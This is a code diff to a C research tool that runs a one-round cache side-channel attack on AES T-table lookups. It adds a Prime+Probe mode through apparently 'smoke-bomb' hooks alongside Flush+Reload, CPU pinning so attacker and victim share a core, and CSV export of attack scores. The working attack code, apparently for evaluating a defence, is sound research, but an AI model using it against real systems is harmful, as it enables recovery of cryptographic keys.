@@ -1,7 +1,7 @@
 /**
  *	sync one round attack
  *
- *	Copyright (C) 2017  Jinbum Park <jinb.park@samsung.com> Haehyun Cho <haehyun@asu.edu>
+ *	Copyright (C) 2017  Jinbum Park <jinb.park@samsung.com>
 */
 
 #include "common.h"
@@ -9,6 +9,11 @@
 #include <libflush.h>
 #include <pthread.h>
 #include <sched.h>
+
+#ifdef PRIME_PROBE
+#include <sb_api.h>
+#include "../../smoke-bomb/header.h"
+#endif
 
 #define MAX_PLAINS 3000
 #define ATTACK_MODE_FULL 0
@@ -194,7 +199,11 @@ static inline void flush_te(U32 x, U32 t)
 
 static inline void flush_te0(U32 x)
 {
+#ifdef PRIME_PROBE
+	smoke_bomb_prime( (unsigned long)(te0 + (x * 16)) );
+#else
 	libflush_flush(session, te0 + (x * 16));
+#endif
 }
 
 static inline int reload_te_is_useful(U32 x, U32 t)
@@ -218,12 +227,24 @@ static inline int reload_te_is_useful(U32 x, U32 t)
 static inline int reload_te0_is_useful(U32 x)
 {
 	uint64_t count;
-	
+
+#ifdef PRIME_PROBE
+	int r;
+
+	r = smoke_bomb_probe( (unsigned long)(te0 + (x * 16)) );
+	count = (uint64_t)r;
+
+	/* If set_idx is accessed, spend more time to probe */
+	if(count > threshold)
+		return 1;
+	return 0;
+#else
 	count = libflush_reload_address(session, te0 + (x * 16));
 
 	if(count < threshold)
 		return 1;
 	return 0;
+#endif
 }
 
 
@@ -246,11 +267,13 @@ static inline void print_score(void)
 	}
 }
 
+U8 theory_arr[16] = {0,};
 void print_theory_arr(int plain_idx)
 {
-	U8 theory_arr[16] = {0,};
 	U8 val;
 	U32 i;
+
+	memset(theory_arr, 0, sizeof(theory_arr));
 
 	/* fill theory arr of one-round encryption */
 	for(i=0; i<16; i+=4) {
@@ -395,6 +418,58 @@ void do_attack(void)
 	}
 }
 
+void print_result_to_csv(void)
+{
+	FILE *fp = NULL;
+	char str[128] = {0,};
+	unsigned i;
+
+	fp = fopen("./result.csv", "w");
+	if (!fp) {
+		printf("fopen error\n");
+		return;
+	}
+
+	snprintf(str, 128, "test count,%d\n", plain_text_cnt);
+	fwrite(str, 1, strlen(str), fp);
+	
+	fwrite("cache result\n", 1, strlen("cache result\n"), fp);
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "0x%lx\n", (unsigned long)(te0 + i * 16));
+		else
+			snprintf(str, 128, "0x%lx,", (unsigned long)(te0 + i * 16));
+		fwrite(str, 1, strlen(str), fp);
+	}
+	
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "%d\n", arr_score[i]);
+		else
+			snprintf(str, 128, "%d,", arr_score[i]);
+		fwrite(str, 1, strlen(str), fp);
+	}
+
+	fwrite("\ntheoretical result\n", 1, strlen("\ntheoretical result\n"), fp);
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "0x%lx\n", (unsigned long)(te0 + i * 16));
+		else
+			snprintf(str, 128, "0x%lx,", (unsigned long)(te0 + i * 16));
+		fwrite(str, 1, strlen(str), fp);
+	}
+	
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "%d\n", theory_arr[i]);
+		else
+			snprintf(str, 128, "%d,", theory_arr[i]);
+		fwrite(str, 1, strlen(str), fp);
+	}
+
+	fclose(fp);
+}
+
 void do_attack_one(void)
 {
 	U32 p, i, c, id, t;
@@ -439,6 +514,7 @@ void do_attack_one(void)
 
 	print_score();
 	print_theory_arr(p);
+	print_result_to_csv();
 }
 
 
@@ -458,6 +534,22 @@ void finalize_libflush(void)
 	libflush_terminate(session);
 }
 
+void bind_cpu(int cpuid)
+{
+    unsigned long mask = 0;
+
+    if(cpuid == 0) mask = 1;
+    else if(cpuid == 1) mask = 2;
+    else if(cpuid == 2) mask = 4;
+    else if(cpuid == 3) mask = 8;
+
+    if(sched_setaffinity(0, sizeof(mask), (cpu_set_t*)&mask) < 0)
+    {
+        printf("sched_setaffinity error\n");
+        return;
+    }
+}
+
 int main(int argc, char **argv)
 {
 	char msg[MSG_SIZE_MAX];
@@ -470,6 +562,11 @@ int main(int argc, char **argv)
 	unsigned int i, j;
 
 	/* init */
+#ifdef PRIME_PROBE
+	bind_cpu(2);	/* Victim & Attacker are running on same core for prime+probe attack */
+#else
+	bind_cpu(1);
+#endif
 	get_args(argc, argv);
 	read_plains();
 	map_crypto(argv[8]);
